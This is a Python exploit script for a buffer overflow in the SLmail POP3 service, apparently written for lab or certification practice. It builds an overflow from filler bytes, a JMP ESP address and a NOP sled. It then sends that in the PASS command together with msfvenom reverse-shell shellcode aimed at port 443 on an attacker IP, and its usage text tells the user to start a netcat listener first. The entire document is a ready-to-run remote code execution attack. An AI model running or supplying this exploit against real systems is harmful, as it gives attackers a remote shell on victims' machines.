# final exploitation script

#!/usr/bin/python
# coding=utf-8

import time, struct, sys
import socket as so


hacked = (        
"    | | | |          | |             __    _    __    _ \n"
"    | |_| | __ _  ___| | __  	    /  '  / \  |  )  / \ \n"
"    |  _  |/ _` |/ __| |/ /  	    \__  |___| |__/ |___| \n"
"    | | | | (_| | (__|   (  ______     \ |===| |  \ |===| \n"
"    |_| |_|\__,_|\___|_|\_\  WITH   \__/ |   | |__) |   | \n\n")

achars = 'A'*2606

jmpesp = '\x8f\x35\x4a\x5f'		#JMP ESP address is  ==> 5F4A358F

nops = '\x90'*16			#NOP Sled

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.152.141 LPORT=443 -f py -b '\x00\x0a\x0d\' -e x86/shikata_ga_nai - THIS MUST BE REPLACED WITH YOUR MSFVENOM OUTPUT
# Shell code for exploitation                                                                      

buf = b"\xda\xca\xd9\x74\x24\xf4\xbf\x33\xe9\xbb\x8b\x5e\x33"
buf += b"\xc9\xb1\x52\x31\x7e\x17\x83\xee\xfc\x03\x4d\xfa\x59"
buf += b"\x7e\x4d\x14\x1f\x81\xad\xe5\x40\x0b\x48\xd4\x40\x6f"
buf += b"\x19\x47\x71\xfb\x4f\x64\xfa\xa9\x7b\xff\x8e\x65\x8c"
buf += b"\x48\x24\x50\xa3\x49\x15\xa0\xa2\xc9\x64\xf5\x04\xf3"
buf += b"\xa6\x08\x45\x34\xda\xe1\x17\xed\x90\x54\x87\x9a\xed"
buf += b"\x64\x2c\xd0\xe0\xec\xd1\xa1\x03\xdc\x44\xb9\x5d\xfe"
buf += b"\x67\x6e\xd6\xb7\x7f\x73\xd3\x0e\xf4\x47\xaf\x90\xdc"
buf += b"\x99\x50\x3e\x21\x16\xa3\x3e\x66\x91\x5c\x35\x9e\xe1"
buf += b"\xe1\x4e\x65\x9b\x3d\xda\x7d\x3b\xb5\x7c\x59\xbd\x1a"
buf += b"\x1a\x2a\xb1\xd7\x68\x74\xd6\xe6\xbd\x0f\xe2\x63\x40"
buf += b"\xdf\x62\x37\x67\xfb\x2f\xe3\x06\x5a\x8a\x42\x36\xbc"
buf += b"\x75\x3a\x92\xb7\x98\x2f\xaf\x9a\xf4\x9c\x82\x24\x05"
buf += b"\x8b\x95\x57\x37\x14\x0e\xff\x7b\xdd\x88\xf8\x7c\xf4"
buf += b"\x6d\x96\x82\xf7\x8d\xbf\x40\xa3\xdd\xd7\x61\xcc\xb5"
buf += b"\x27\x8d\x19\x19\x77\x21\xf2\xda\x27\x81\xa2\xb2\x2d"
buf += b"\x0e\x9c\xa3\x4e\xc4\xb5\x4e\xb5\x8f\x79\x26\x2d\xc2"
buf += b"\x12\x35\x4d\xdc\x59\xb0\xab\xb4\x8d\x95\x64\x21\x37"
buf += b"\xbc\xfe\xd0\xb8\x6a\x7b\xd2\x33\x99\x7c\x9d\xb3\xd4"
buf += b"\x6e\x4a\x34\xa3\xcc\xdd\x4b\x19\x78\x81\xde\xc6\x78"
buf += b"\xcc\xc2\x50\x2f\x99\x35\xa9\xa5\x37\x6f\x03\xdb\xc5"
buf += b"\xe9\x6c\x5f\x12\xca\x73\x5e\xd7\x76\x50\x70\x21\x76"
buf += b"\xdc\x24\xfd\x21\x8a\x92\xbb\x9b\x7c\x4c\x12\x77\xd7"
buf += b"\x18\xe3\xbb\xe8\x5e\xec\x91\x9e\xbe\x5d\x4c\xe7\xc1"
buf += b"\x52\x18\xef\xba\x8e\xb8\x10\x11\x0b\xc8\x5a\x3b\x3a"
buf += b"\x41\x03\xae\x7e\x0c\xb4\x05\xbc\x29\x37\xaf\x3d\xce"
buf += b"\x27\xda\x38\x8a\xef\x37\x31\x83\x85\x37\xe6\xa4\x8f"
               
  
overflow = achars + jmpesp + nops + buf 	# formatted buffer string

try:
   server = str(sys.argv[1])			# Target IP
   port = int(sys.argv[2])			# Targt Port
except IndexError:
   print "[+] Usage example: python %s 192.168.220.134 110" % sys.argv[0]
   print "Make sure to use netcat first. Example: nc -nlvp 443"
   sys.exit()

s = so.socket(so.AF_INET, so.SOCK_STREAM)
print "\n[+] Attempting to send buffer overflow to SLmail...."
try:
   s.connect((server,port))
   s.recv(1024)
   s.send('USER Hsaba' +'\r\n')
   s.recv(1024)
   s.send('PASS ' + overflow + '\r\n')
   print "\n[+] Completed. Check netcat for shell."
   print ("\033[1;32;48m")
   print hacked
except:
   print "[+] Unable to connect to SLmail. Check your IP address and port"
   sys.exit()
